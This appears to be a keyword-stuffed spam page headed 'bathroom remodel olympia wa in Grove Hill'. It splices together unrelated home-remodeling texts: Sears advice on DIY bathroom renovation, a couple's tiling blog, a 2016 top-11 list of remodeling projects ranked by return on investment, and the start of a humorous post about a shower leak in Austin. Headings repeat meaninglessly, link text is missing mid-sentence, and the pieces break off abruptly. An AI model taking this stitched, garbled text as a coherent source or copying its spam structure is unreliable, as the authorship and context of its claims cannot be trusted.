   <div>   <p><strong>Thinking of taking on a ? Avoid a renovation disaster; Sears Home Services offers the following advice when thinking about doing a remodel yourself.</strong></p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>DIY renovations are not for the faint of heart. &#x201c;Almost everything in the bathroom has a mechanical rough-in to it, and there are plumbing, space and ventilation issues to consider,&#x201d; says Maria Stapperfenne, president of the National Kitchen &amp; Bath Association. Whether you use a professional or are making relatively straightforward DIY tweaks, like replacing a toilet or changing out a vanity for one that&#x2019;s the same size, it&#x2019;s good to know what lies ahead.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Money Matters</strong> &#x201c;Most people don&#x2019;t budget enough money for their project,&#x201d; says Joe Maykut, director of product management at Sears Home Improvement. &#x201c;The bathroom is second only to the kitchen in costs for renovation.&#x201d; And it&#x2019;s not just the drool-worthy products and finishes that add dollars. Be prepared for unforeseen work. &#x201c;Water can infiltrate behind walls in a shower and tub area for years, causing damage not seen from the finished sides of the walls,&#x201d; Maykut warns.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Make a Plan</strong> The bathroom has to be functional, so upfront planning is crucial. Here are some things to consider.</p>   <ul>    <li><strong>Accessibility and safety:</strong> Consider vanity and toilet heights and the space around a toilet. This is especially important if there&#x2019;s a user in a wheelchair. Choose slip-resistant flooring &#x2014; something textured for traction. A zero-threshold shower will help to avoid tripping hazards. If there are to be handholds or grab bars, you may need blocking in the walls. (Although there are new products that have special anchoring systems so no blocking is necessary.)</li>    <li><strong>Space:</strong> The double sink you covet might not fit. &#x201c;In a traditional vanity configuration, you don&#x2019;t want to go under 5 feet,&#x201d; Stapperfenne says. There are some integrated double sinks, but they &#x201c;tend to be contemporary in design&#x201d; and may not fit your d&#xe9;cor.</li>    <li><strong>Easy maintenance:</strong> White grout will show traffic patterns. Stapperfenne suggests a pewter or medium grey grout. While a marble counter is de rigueur, it also is soft and requires sealing to prevent it from staining.</li>   </ul>   <p><strong>Installation Issues</strong> Think it&#x2019;s easy to swap one fixture for another? Think again. Changing the toilet means seating it properly on the wax ring so you don&#x2019;t get leaks. Installing a shower means pitching the drain pan or floor correctly. For a sink, the drains have to be properly oriented to prevent the backup of sewer gases. Want multiple body sprays in the shower? You&#x2019;ll need a thicker supply line to deliver the necessary water volume, and you&#x2019;ll have to correctly size your drain for the water&#x2019;s evacuation. For a truly successful full bathroom renovation, know when to . &#x201c;It&#x2019;s really too detailed a space to do yourself,&#x201d; Stapperfenne says. &#x201c;It can be overwhelming.&#x201d;</p>  </div>

   <div>     <p>After getting all the prep work done&#xa0;we were ready for our next step to our which was&#xa0;installing the tile.&#xa0; Karen and I have never laid any tile so being novice tile layers we were feeling a little intimidated, but we forged ahead.&#xa0; We did our research, read some books, watched some videos, measured twice, cut once, and got started.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>After picking out our tile the next big decision was do we purchase a nice tile saw?&#xa0; We quickly came to the decision to go ahead and buy one, since we know that we do not work very fast.&#xa0; It cost us about $200 to buy one, but turned out to be well worth it! &#xa0;If we had rented a tile saw it would have been $60 a day plus the purchase of a new blade and since the tile work took us 3 days to do we made a wise decision to go ahead and buy, and now I have a new tool. </p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Karen and I used the same team work plan as we did when we put down the wood floors. &#xa0;Karen did all the measuring, and I cut the tile.&#xa0; During our research Karen found a video on YouTube that showed us a trick&#xa0;about how to make sure the tile is level.&#xa0; The trick uses a 1&#x201d;x2&#x201d; board that we leveled and screwed into the back wall.&#xa0; The 1&#x201d;x2&#x201d; is used to rest the tile on as they are applied to the wall.&#xa0; We then had to wait for that to dry and harden. &#xa0;After the upper tiles were dry we could remove the 1&#x2033;x2&#x2033; and the lower tiles were taped to the ones above to hold them in place.&#xa0; This way we were assured that all the tile is level.&#xa0; The technique worked a lot better than just eyeballing it. </p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The next couple of days were spent doing the same thing.&#xa0; Karen doing all the measuring and I&#xa0;was still doing all the cutting.&#xa0; We also had to make sure that our thin set was just right, and it was put on the wall with just the right thickness.&#xa0; &#xa0;Every now and again we would&#xa0;apply a tile and lift it back up to make sure we were getting full coverage on the back of the tile.&#xa0; We also used spacers and painters tape to make sure our entire tile was lined up and spaced correctly.&#xa0; After finishing the tub surround we moved on to the floor. </p>   <p>There was only one real mishap and that was when we were working past our bedtime.&#xa0; We were both getting a little tired and frustrated that this project was taking a little bit longer than expected, which caused us to break a tile. &#xa0;It was one of the last <em>l-o-n-g</em> evenings of tiling and Karen was using a rubber mallet to hammer the last tile down level with the others. &#xa0;And, out of sheer frustration, Karen turned into Thor and smashed it right in half!&#xa0; We laughed about it and I went to cut another one and finally got that last piece into place. </p>   <p>Our final step with the tile was to grout it.&#xa0; Karen mixed up the grout I pushed it in, and then she cleaned off the excess.&#xa0; The grout was probably the easiest part of the job.&#xa0; Just make sure it does not stay on the tile too long before you clean it off.</p>   <p>The following evening Karen&#x2019;s Dad came over to put in the wiring for our new exhaust fan/light, and to help me install a new toilet. &#xa0;Karen and I hung a mirror over the sink, and put in a new cabinet over the toilet for towels and other bathroom toiletries. </p>   <p>Now all that we have left to do is install a granite or marble countertop and re-do the wood work.&#xa0; Thanks for sharing in our adventure! </p>   <center>    <div>     <div>      <table>       <tbody>        <tr>         <td> <p>Get free daily email updates!</p> </td>         <td><p>Follow us!</p> </td>        </tr>       </tbody>      </table>     </div>    </div>   </center>   <div>    <div>     <h3>Related Posts</h3>    </div>   </div>    </div>

However, the handy husband I have read and researched about how to soder and fixed the copper piping. </p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>We also painted the vanity, however as you will see in the pictures, once we got the vanity repainted we no longer liked the countertop. So we changed that also. Then we repainted the walls. Finally, Rich needed a new toillet. The old on apparently didn&#x2019;t have enough &#x201c;flushing power&#x201d;. </p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>To see more of the renovation . </p>   </div>   <div>    Posted in ,   </div>   <div>    | |   </div>  </div>  
   <div>   <p>Billions and billions and billions of dollars. That&#x2019;s what Americans spent on home remodeling in 2015. More like hundreds of billions. And 2016 is fully expected to continue that trend. Major renovations and significant additions to a home are key factors in why that figure is so astronomical! But, if we&#x2019;re all honest, remodeling is the type of project we all consider doing or want to do. According to the National Association of Remodeling Industry (NARI), around 50% of homeowners surveyed in suburban and urban areas say they are willing to remodel their living space, and over two thirds of rural home owners convey that willingness. While a third of all home owners consider it easier to just move to a new home than tackle a remodeling project.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>People remodel for many reasons, and 75% of us report feeling a <strong>major sense of accomplishment</strong> as a result of a completed project. Better functionality and livability, or what we will refer to as the <strong>&#x2018;enjoyment factor&#x2019;</strong>, is generally cited as the top reason for why remodel at all. Other factors like knowing better materials are in place, appreciating the beauty of an upgrade and making changes to fit the owner&#x2019;s feeling of their living space are considerable factors. But it is the joy factor that we wish to emphasize.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p>Above that however is the overall cost value. Also known as ROI, or return on investment, this factor is our primary consideration. Money spent for home improvement is usually seen as an investment that is recouped at the time of sale. For our purposes, it works out best to understand that as if the home is being sold within a year of a remodeling project. Yet, certain improvements have lasting value, of more than 1 year. So longevity is certainly a consideration for all home remodeling considerations.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Our top list is intended to be easy to read, simple to understand and intending to provide advice should you be considering any of these projects going forward. Or perhaps you are wondering which one(s) may be better to tackle than others. As this isn&#x2019;t the only list of its kind, we chose to go about things a bit differently than others. Here is the basic scale of what into which items made our list and the order in which they appear:</p>   <p>Cost value (or ROI) is the most weighted factor. A few items on the list will actually return more in terms of recouped value than what you, the owner, put into it. Pretty sweet, huh? Unlike some other lists, we&#x2019;d rather not overwhelm you with a long list of percentage points and so instead we go with a scale of:</p>   <p>100% or higher ROI = Supreme (cost value)</p>   <p>90% to 99% = Great</p>   <p>75% to 89% = Very Good</p>   <p>67% to 74% = Good</p>   <p>Anything lower than a return of two thirds the cost you put into it, was not good enough for our list.</p>   <p>Enjoyment Factor is second highest consideration. This is the element that makes homeowners want to be in their home environment more as a result of the completed project. NARI and other organizations will survey homeowners periodically to check on such data and ours comes from December 2015, or later. This scale is:</p>   <p>100% = Top Notch (rare, but it happens)</p>   <p>95% or higher = Great</p>   <p>90% to 94% = Very Good</p>   <p>80% to 89% = Good</p>   <p>Curb Appeal is what prospective buyers are going to notice about a home from the street. If the home upgrade is an item that fits into this category, we decided it deserves to be considered third highest factor in terms of overall value. This is essentially a yay or nay type notation.</p>   <p>Energy Efficiency is a trending item in recent years and 2016 is certainly continuing on that trajectory. Some items on our list have very little to no impact on energy savings, but most do. This is the 4th most important factor we make note of.</p>   <p>Cost &#x2013; inexpensive (lowest) to very expensive (highest) is something we chose to make note of as a factor that at least some owners would wish to consider. As cost value is already being considered, and most weighted, we decided to keep this as the lowest factor, while still realizing for some homeowners, it may be what is most doable for them.</p>   <p>We&#x2019;ll also make notes regarding what each project entails, the longevity you can expect from completion of the upgrade, alternatives to the entry on our list, and some advice from us in how to implement the project or weighing of pros and cons among the entry item and its alternative(s).</p>   <p>An added note regarding cost. The ROI is our primary focus, as this means whatever the cost you actually spend on materials and labor, is what you can hope to get back at time of sale, but this does assume the sale is done relatively soon after the job is completed (generally within a year). We also indicate a cost range and median pricing point, or national average for the remodeling project. There are many factors that go into pricing any job and so the averages are likely best taken with a grain of salt, which is why the range is meant to provide a decent estimate of what is low and high end for the costs. This assumes a professional contractor is in charge of the project, and in general it assumes the house is around 2000 square feet. Where applicable, we all add in a price per sq. ft., which ought to help with realizing the price you can expect to pay for materials/installation of the work.</p>   <p>For the fun of it, we&#x2019;ll go in reverse order. Our highest value item will be at the end and we&#x2019;ll start with an item that is actually highly coveted by many home buyers. Cue up the gong sound, the top 11 list starts&#x2026;. now.</p>   <p>#11 &#x2013; <b>Major Kitchen Renovation</b></p>   <p> A Marvelous Chef&#x2019;s Kitchen by </p>   <p>Originally, our list was going to be 10 items, but in paraphrasing the wise words of Nigel Tufnel (Spinal Tap), &#x201c;this list is better than the ones by those other blokes, because this one goes to eleven.&#x201d; Actually, it goes to eleven for another reason, as a is the third highest item on our list in terms of enjoyment factor. Usually, when any homeowner considers a first project for improving their living space, the kitchen is most desired. It is also the type of remodeling that prospective owners report as top consideration for what they look for inside a home; a well designed kitchen with all the modern conveniences.</p>   <p>The alternative to this project is a minor kitchen upgrade. The difference between the two is the renovation will physically change the design of the room, whereas minor upgrade will not. Both will address and refinish any surface in the room that needs a makeover. And both projects will likely replace older fixtures and appliances with up to date, energy efficient products. With a room redesign comes additional energy efficiency concerns that any professional home designer is fully taking into account. The complete renovation though is overall more costly, and is tied with most expensive item on our list (see #9). A minor upgrade, if truly an upgrade and not just a superficial upgrade is going to cost about half the total price of a major renovation, or at a median price point of around $30,000 (for upgrade).</p>   <p>ROI = Good</p>   <p>Enjoyment Factor = Great</p>   <p>Curb Appeal = Not Applicable (N/A)</p>   <p>Energy Efficiency = Yes, but minor</p>   <p>Cost factor = Very Expensive</p>   <p>Cost range / median price = $50,000 to $80,000 / $60,000</p>   <p>Cost per sq.ft. = Not available</p>   <p>Longevity = 20 years or more before minor upgrade would be considered</p>   <p>#10 &#x2013; <b>Patio Addition</b></p>   <p> Traditional Patio Area with a Fire Pit by </p>   <p>Adding a patio or deck to a property increases livability space, and so no surprise the enjoyment factor of the home environment will increase. This is the first of 7 items on our list that are an exterior upgrade. As this type of addition usually occurs in the back yard of a property, the curb appeal is low to non existent for this improvement. Yet, once a human notices this is included in the property, the appreciation for the premises increases.</p>   <p>Patios are constructed of stone type materials, such as concrete, flagstone, pavers or gravel. It edges out a deck in terms of ROI because it entails less maintenance and is likely to last much longer, so more return in terms of time on the investment.</p>   <p>A deck is usually made of wood material or wood composite. The con, and reason for slightly lower ROI, is wood is subject to more wear and tear plus it tends to cost considerably more than a patio. But part of the reason it costs more is it offers a greater opportunity to manipulate the design of the overall structure than a simple patio. For some future buyers, that will work well, while others may dislike the design choices and dislike the considerable investment it would mean for them to transform it into something they like. Yet, the enjoyment factor is high for the current owner and provides a way to enjoy the outdoor portion of your property unlike any other aspect.</p>   <p>ROI = Very Good</p>   <p>Enjoyment Factor = Very Good</p>   <p>Curb Appeal = N/A</p>   <p>Energy Efficiency = N/A</p>   <p>Cost Factor = Inexpensive</p>   <p>Cost Range = $1750 to $4500</p>   <p>Cost per sq.ft. = Concrete patio is $8.50 per sq.ft; Gravel is $1.50 per sq.ft.</p>   <p>Longevity = 50+ years, subject to cracking but it&#x2019;s stone and will last a mighty long time</p>   <p>#9 &#x2013; <b>Additional Bathroom</b></p>   <p> Is it any wonder that 100% of the homeowners surveyed about the addition of a new bathroom to their house were very pleased? Were that not the case, this item might not even be on our list as it is tied for most costly item. While new buyers care about the amount of , they more or less take the amount in that home for granted, whereas a current owner is very happy to add this type of room to the home.</p>   <p>The alternative here is just a matter of whether the addition is a full bath or half bath. In our figures below, we are assuming full bath. While the con for that consideration is the added cost, the ROI is simply better when compared to a half bath. A full bath will fetch a full 20% in increased value of a home, while the half bath can only get 10% added value.</p>   <p>Half bath generally means toilet, sink and mirror, but what combination of fixtures is really up to the homeowner. A half bath will not include shower/tub, while the full bath does. Both additions are adding room, and the full option obviously needs extra space. The cost is challenging to estimate for half bath as size will vary, but it is possible that it would cost as much as a (small) full bath, and likely will be more than half the cost regardless of how small the half bath is. Due to the great expense, it is an item that can&#x2019;t be justified for higher position on our list. But given the incredibly high enjoyment factor, it can&#x2019;t be kept off of a top list where overall value is being considered.</p>   <p>ROI = Good</p>   <p>Enjoyment Factor = Top Notch</p>   <p>Curb Appeal = (Hopefully) N/A</p>   <p>Energy Efficiency = Yes, some due to fixtures likely taking advantage of modern standards</p>   <p>Cost Factor = Very Expensive</p>   <p>Cost range / median price = $40,000 to $80,000 / $60,000</p>   <p>Cost per sq.ft. = N/A</p>   <p>Longevity = 20+ years before upgrade or renovation would be considered</p>   <p>#8 = <b>Vinyl Window Replacements</b></p>   <p> From this point on in our list, energy efficiency increases and very expensive projects are gone. Though this is the third most expensive project, but far less than the two others (#9 and #11) that are costly upgrades.</p>   <p>Window replacements will naturally deal with energy efficiency as many homes have lots of windows on most, if not all, sides of the residence. These areas represent what would otherwise be enormous gaps in the home design. But window replacements have added bonus of boosting curb appeal, though not quite as high as some other entries on our list.</p>   <p> Vinyl windows are considered a great investment as the need for maintenance is low and the paint or color is baked in during manufacturing. Factory produced vinyl windows come in a wide array of color options, which won&#x2019;t fade for a long time. Plus vinyl costs less than the traditional alternative of wood.</p>   <p>Wood windows are preferred by some because the natural look is not something vinyl can achieve. But wood windows costs considerably more, like hundreds more per window or a good 30% increase if not higher.</p>   <p>Window replacements, especially vinyl tend to have a high enjoyment factor. Numerous areas of the home are all receiving upgrades, and visible to anyone that looks. People take pride in window upgrades, and new buyers appreciate it, though tend to take it for granted as all homes have windows, so expectation to be wowed is fairly low.</p>   <p>ROI = Very Good</p>   <p>Enjoyment Factor = Very Good</p>   <p>Curb Appeal = Yes</p>   <p>Energy Efficiency = Yes, and is primary consideration for why owners do this project</p>   <p>Cost Factor = Expensive</p>   <p>Cost Range = $8000 to $17,000 (assumes home has 10+ windows)</p>   <p>Cost per window = $450 to $600</p>   <p>Longevity = 40+ years</p>   <p>#7 = <b>Vinyl Siding</b></p>   <p> The variety of options for adding / updating siding to a home is many, though vinyl and fiber cement are the trending favorites in recent years. Wood, brick and stone are the traditional offerings.</p>   <p>When it comes to getting the most bang for the buck, vinyl siding usually wins over fiber cement. It <strong>costs less</strong>, and in reality, it has roughly the same quality as fiber cement. The cost value is therefore better with vinyl, which surprises some homeowners, especially those who adore fiber cement.</p>   <p>The pro consideration for fiber cement siding cannot be overstated. It carries an enjoyment factor that is unsurpassed by any other entry on our list, though is matched with #9. But on average fiber cement siding costs about $19,000 and is very good in terms of cost value, as is vinyl siding. If this article were strictly presenting exact percentages it would be 79% for fiber cement, while vinyl recoups costs at 83%.</p>   <p>Both types of siding offer great variety in color, more than essentially every other material available, and are far more durable / long lasting than wood. Brick and stone win on longevity but not on cost. All new siding is going to contribute to energy efficiency, as well as to curb appeal. Ultimately, siding is a rather subjective decision, and to our tastes, as wonderful as fiber cement is according to all those owners that choose it, we believe it&#x2019;s perception of being the premium material for siding is rather arbitrary when an honest comparison is made with vinyl, whose colors hold up as well if not better.</p>   <p>ROI = Very Good</p>   <p>Enjoyment Factor = Good</p>   <p>Curb Appeal = Yes, arguably a top 3 consideration</p>   <p>Energy Efficiency = Yes, for our list it is 3rd highest contributor</p>   <p>Cost Factor = Moderately Expensive</p>   <p>Cost Range / Median Average = $9,000 to $16,000 / $12,000</p>   <p>Cost per sq.ft. = N/A</p>   <p>Longevity = 50+ years until color fades enough to be noticeable and surface is possibly worn</p>   <p>#6 = <b>Manufactured Stone Veneer</b></p>   <p>Stone veneer is the type of remodeling project that works for both interior and exterior improvements. And is the only item on our list that has this going for it. We are generally sticking to the idea of it being used as a siding material, and in many cases it is mixed with a second material where the stone is on lower half of a facade and wood or vinyl is the upper material.</p>   <p>Manufactured stone veneer (MSV) has been trending as a top 5 consideration for several years now. It just misses our top 5 because it scores lower on energy efficiency and isn&#x2019;t a look that has consistency in terms of curb appeal. It&#x2019;s also not a low cost option for improving a home. Still, it&#x2019;s cost value is fairly high because enough people do appreciate the look of stone and the perception of durability that comes with it.</p>   <p>MSV is also known as faux stone, which might seem like an obvious con, but not really. Not when you consider the price of natural stone veneer (at least twice as much for the material) and MSV is far less labor intensive, and therefore less costly, to install. Plus MSV has a lighter weight factor which means it can be applied in locations where natural stone would necessitate a stronger support structure.</p>   <p>The idea that it can complement with interior design to match exterior is a huge plus. Get the right interested buyer that appreciates the veneer look and the value is hard to compete with.</p>   <p>The con with MSV is that while it is usually marketed as easy to install, it can pose problems if not properly installed. So, saving on cost for installation is tempting, but could lead to a product that is collecting water and trapping it below its non-exposed surface. Plus, easy-to-install is a bit of hype as it it is fairly labor intensive compared with other remodeling jobs and relies on a sense of timing or dedication to setting the material so it is properly stuck into place.</p>   <p>The longevity factor and less cost compared to the natural stone veneer are the the biggest things it has going for it.</p>   <p>ROI = Great</p>   <p>Enjoyment Factor = Good</p>   <p>Curb Appeal = Yes</p>   <p>Energy Efficiency = Yes, but not substantial</p>   <p>Cost Factor = Moderately Expensive</p>   <p>Cost Median = $7500 for material and installation</p>   <p>Cost per sq.ft. = $4 to $8, depending on who is installing</p>   <p>Longevity = 50+ years</p>   <p>#5 = <b>Hardwood Floor Refinishing</b></p>   <p>Welcome to the first of the top 5 items on our list. Three of them have Supreme cost value, and hardwood floor refinishing is one of these. For many lists this is a top 5 consideration, or even top three. Because it offers no curb appeal nor contributes to energy efficiency it is slightly lower on our list. What it lacks in curb appeal, . It is easily noticeable for anyone who may visit your home, and is second on this list to Kitchen renovation/upgrade in terms of what home buyers covet. Plus, existing homeowners will love it when the job is completed. How can you not appreciate a project that increases the natural beauty of wood?</p>   <p>The con, if there is any, is the time it takes to do, and what it entails. A homeowner has to remove all furniture from the area being refinished and because coats of finish need a couple of weeks to apply, it can be a bit inconvenient during its application process. Other rooms are sectioned off with plastic so the dust and fumes stay only to the area being worked on, though adequate ventilation is necessary.</p>   <p>The alternative for refinishing is new wood, and in some cases that is easily the better way to go. While that doubles the cost, it lessens the time as new finished wood has its coats applied in a factory setting. New wood flooring also doesn&#x2019;t have the same cost value because it can only be brand new for a short period and like anything new, it loses value almost immediately. Not a lot, but enough to rationalize why new wood flooring is not the entry on our list while refinishing is. Wood floors in general will last a long time (100+ years), but to maintain the quality of a finely finished wood floor, they need to be refinished every 3 to 10 years depending on amount of traffic or use they get. If wood is warped or greatly damaged, then new wood is the obvious choice and refinishing would either be a bad choice or not possible.</p>   <p>ROI = Supreme</p>   <p>Enjoyment Factor = Great</p>   <p>Curb Appeal = N/A</p>   <p>Energy Efficiency = N/A</p>   <p>Cost Factor = Inexpensive</p>   <p>Cost Range = $550 to $750 per room; $1500 to $3000 for a home</p>   <p>Cost per sq.ft. = $3 to $6, depending on amount of sanding and applied coats</p>   <p>Longevity = 3 to 10 years</p>   <p>#4 = <b>Insulation Upgrade</b></p>   <p> Home insulation generally deals with into the attic of a home. It may entail adding similar material to the walls, but for our purposes we are assuming the upgrade is strictly for the attic. Chances are most homes already have some insulation and so an upgrade is needed to get to a desired or standard thickness.</p>   <p>The standards for insulation will change over time, and can vary by local building ordinances. The level of thickness is measured by an &#x201c;R&#x201d; value which stands for &#x2018;resistance to heat flow.&#x2019; The greater the R value, the better the insulation. R-30 is generally considered standard minimum.</p>   <p>Were our list based solely on ROI, insulation upgrade would top the list. Whatever you spend on it, a return of up to 120% of that cost is not unheard of and 100% or more is likely. It is one of those things new buyers don&#x2019;t want to think about having to do, and if it is already done, it shows the previous owner dealt with a fundamental consideration for home maintenance and exercised concern for energy efficiency.</p>   <p>As our list includes other factors, this appears outside the top three because it offers no curb appeal and the joy factor isn&#x2019;t all that great. It probably wouldn&#x2019;t come up at all for a new buyer except when they have a home inspector review condition of the house and inform them that this remodeling upgrade is up to standard.</p>   <p>ROI = Supreme</p>   <p>Enjoyment Factor = Good</p>   <p>Curb Appeal = N/A</p>   <p>Energy Efficiency = Yes, a top consideration</p>   <p>Cost Factor = Inexpensive</p>   <p>Cost Range = $1000 to $2000 for attic</p>   <p>Cost per sq.ft. = $.90 to $1.50 (for either types of material)</p>   <p>Longevity = 25 years or when standards relating to R value change, whichever comes first</p>   <p>#3 = <b>New (Steel) Garage Door</b></p>   <p>Check any list in the last few years, and this remodeling upgrade will surely be in the top 5. If it somehow managed to contribute to energy efficiency, it would be higher on our list, but alas that is not the case.</p>   <p>For a basic, inexpensive new steel door the curb appeal factor is decent. This is a fairly large item that is likely contrasting in color with other exterior items on a home&#x2019;s facade. It may be a subtle color that blends in as a background item, or may not even be noticeable from the front of a home, but it provides immediate bang for the buck. Steel is added parenthetically because it is not the best option necessarily, but is the least expensive and holds lasting value.</p>   <p>Wood or wood composite are generally more aesthetically pleasing alternatives with design options that can be more bold than steel. Steel garage doors will provide better variety in terms of color with no additional labor and are easier to maintain. But a wood door when done right offers curb appeal unmatched by almost every other item on this list. Though that comes with a cost, and a well designed, wood garage door can be as much as five times the expense of a simple steel door. Go with wood composite instead and it&#x2019;ll still be more expensive than steel, but provides a middle of the road type option to save on cost.</p>   <p>ROI = Very Good to Great</p>   <p>Enjoyment Factor = Very Good to Great</p>   <p>Curb Appeal = Yes, wonderful</p>   <p>Energy Efficiency = N/A</p>   <p>Cost Factor = Inexpensive</p>   <p>Cost Range = $750 to $1500 for 16&#xd7;7 steel door, more for extra design elements like windows</p>   <p>Cost per sq.ft. = N/A</p>   <p>Longevity = 15+ years before replacement would be considered</p>   <p>#2 = <b>New Steel Entry Door</b></p>   <p>The front door to a home is the entry to a whole new world, or life, for a potential buyer. So curb appeal for this item is fairly high. Like a garage door, it can be designed to contrast with the rest of the home&#x2019;s facade and provide a bold or elegant appearance. Unlike a garage door, this remodeling project does contribute to energy efficiency, though not as substantially as other items on the list.</p>   <p>For pretty much all other top remodeling lists, this item appears at number 1 and has for many years running. It&#x2019;s an inexpensive job, the enjoyment factor is high, and curb appeal is great. But the cost value is actually not as great as it could be, or perhaps better stated as not as high as our #1 item, nor #4 and #5.</p>   <p>The alternatives to steel are fiberglass door and wood. All three have such extensive variation in designs that they truly do deserve to be considered a top 2 choice on a list such as this. Steel tends to be the least expensive, while wood can be around two to three times that cost, though depends on what the designs entail. Same goes for wear and tear or the longevity factor, steel may have basic options that have it less durable than wood, but in general wood is the least resistant to wear and tear and fiberglass the best for longevity and yet the most expensive.</p>   <p>ROI = Very Good to Great</p>   <p>Enjoyment Factor = Great</p>   <p>Curb Appeal = Yes, Wonderful</p>   <p>Energy Efficiency = Yes, though not substantial</p>   <p>Cost Factor = Inexpensive</p>   <p>Cost Range = $1000 to $2000</p>   <p>Cost per sq.ft. = N/A</p>   <p>Longevity = 30 to 100 years, lower end depends on wear and tear and desire for change</p>   <p>#1 = <b>New Asphalt Shingle Roofing</b></p>   <p> If you&#x2019;ve read the other items on our list, you realize we take several factors into account and new roofing scores well on all factors. Sure, the than the other four items in our top 5, but with asphalt shingles it is only moderately expensive, and we feel strongly it provides the best bang overall for the cost value it delivers. In our analysis, there really wasn&#x2019;t a close second place project.</p>   <p>A front door may be wonderful in design, more appealing at first glance from the curb and again less expensive. It is the entry way to a new life for potential buyer. But the roof is fundamental to all homes in providing protection, plus contributing to energy efficiency and far exceeding cost value of a entry door or garage door.</p>   <p>New roofing can also provide design options that can best present options for. Items such as flashing material for vents, chimney updating, skylights are all considerations here. Solar paneling is an improvement that may not be on these type of lists in the twenty-teens, but give it a few years and it may be a top 10 value option. A roofing upgrade will have you consider this, and thus improve what is already a substantial energy efficient home improvement option.</p>   <p> A viable alternative for asphalt shingles that we&#x2019;d have you consider is metal roofing. Color options increase dramatically, it&#x2019;s a lighter weight, far more durable material. Plus, with cool roofs increasing in popularity, there is even greater energy efficiency available. Yet, cool metal roofs also take what is a moderately expensive upgrade and makes it very expensive. The <strong>cost value though is still going to be great</strong> should you decide to go with metal roofing.</p>   <p>A new home owner doesn&#x2019;t want to move into a house that needs a roof upgrade, insulation upgrade or anything that is fundamental to very basic energy efficiency. They&#x2019;ll expect that is already taken care of. Many of the other items on this list are somewhat subjective design related features (like doors, patios, siding) and you could conceivably count on a new buyer wanting those items to be different. With a roof, all of us want to know it is good to go for many years. It&#x2019;s icing on the cake if the current roof takes into account additional design elements.</p>   <p>ROI = Supreme</p>   <p>Enjoyment Factor = Great</p>   <p>Curb Appeal = Yes, substantial</p>   <p>Energy Efficiency = Yes, substantial</p>   <p>Cost Factor = Moderately Expensive</p>   <p>Cost Range / Median Price = $5000 to $12,000 for professional installation / $7600</p>   <p>Cost per sq.ft. = $3</p>   <p>Longevity = 25+ years, warranties for asphalt shingles may be as high as 50 years</p>   <p>So, there are the top 11 projects we see as the best values for home remodeling in 2016. But that&#x2019;s not all! We have other projects deserving honorable mention. For cost value, those not on our list that provide good ROI are: HVAC Replacement (71% return) and (69%). Our list does cover all remodeling upgrades that are known to be Very Good or better. Those less than 67% and say better than 50% are still okay, but not worthy of honorable mention by our standards. The fact is, any remodeling job you choose will recoup some costs as you are adding some value to the overall property.</p>   <p>With enjoyment factor, the only addition worthy of honorable mention (besides the two mentioned in previous paragraph) is Converting Attic Space into a Living Area. As you can see, the desire for extra living space or renovating existing spaces usually leads homeowners to a greater desire to be at home, enjoying their current accommodations. Yet, there are some common, or more traditional items many owners think are a quick bang for the buck which will surely please a potential buyer. Items such as: bathroom renovation, master suite addition and closet renovation are actually not so good when it comes to what appeals to new buyers. But if these appeal to you as current owner, then don&#x2019;t let our factors dissuade you from what will make you happy. Our data is obviously emphasizing what are the trends for current home buyers.</p>   <p>For energy efficiency, the two honorable mentioned items are and Solar Power Panels. Both of these came close to being on our list, but other factors kept them out of top 11, and would still have them be top say 25 considerations. We did briefly mention Solar Power Panels and wouldn&#x2019;t be surprised if in a few years that type of remodeling improvement is a top 10 consideration for cost value.</p>   <p>With curb appeal, it really is about the primary items on the facade of the house that matter most. We covered all of that, but honorable mention has to make note of landscaping. Much of that can be superficial changes, such as decorative lights along the sidewalk or temporary yard fixtures and floral arrangements. Many people find that appealing when pulling up to a new home. The basics of landscaping such as a well kept lawn and proper balance of green plants or trees are items that are taken for granted by potential buyers. If they are lacking or in poor condition, it would benefit any homeowner to address those first.</p>   <p>Renovating and upgrading has been our focus for this article and we&#x2019;ve provided enough information for what to improve in a home, for at least the next year. Repair ought to come first wherever that is needed in your home. But you already know that, and in the off chance you do not, then allow a renovation or upgrade project to take care of those repairs, so you are able to address both needs at once.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

Think of it as &#x201c;This Old House&#x201d;, except instead taking you through the remodel of a charming 400 year old home in New England, I&#x2019;m taking you through the repair of a leaky bathroom in a mid-90&#x2019;s mass-produced planned-community home in Austin, TX.</p>   <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>The events up to this point have been thoroughly documented in not one, not two but THREE posts.</p>    <p>Let me catch you up, there has been:</p>    <p> (The discovery phase)</p>    <p> (The denial phase)</p>    <p> (The panic phase)</p>    <p>For those of you who prefer Cliff&#x2019;s notes, here&#x2019;s how a simple shower leak has evolved into an entire bathroom remodel in 10 easy steps:</p>    <p>1. It started with identifying an odd smell in our master bedroom closet. Surely it must just be the shoes or the laundry, <em>right?</em></p>    <p>2. &#x201c;Hey, why&#x2019;s there a giant wet spot in our closet? Let&#x2019;s pretend the cats did it and just continue to step over it for a week before we actually investigate further.&#x201d;</p>    <p>3. Oh Crap</p>    <p>4. One morning, after closing the bathroom door to keep the cats from puncturing their little paws on the nails in the carpet strip, we discover that a) The door is locked from the inside and b) Whoever installed the doorknobs didn&#x2019;t use the kind where you can pop the lock open with a pin so instead my husband MacGyvered it open with a slap bracelet.</p>    <p>&#xa0;</p>    <p>5. Our doorknob looked like this for about 2 months</p>    <p>6. Husband to the rescue!</p>    <p>7. There were months of material research that required lots of Nintendo DS bribery</p>    <p>8. As with any house 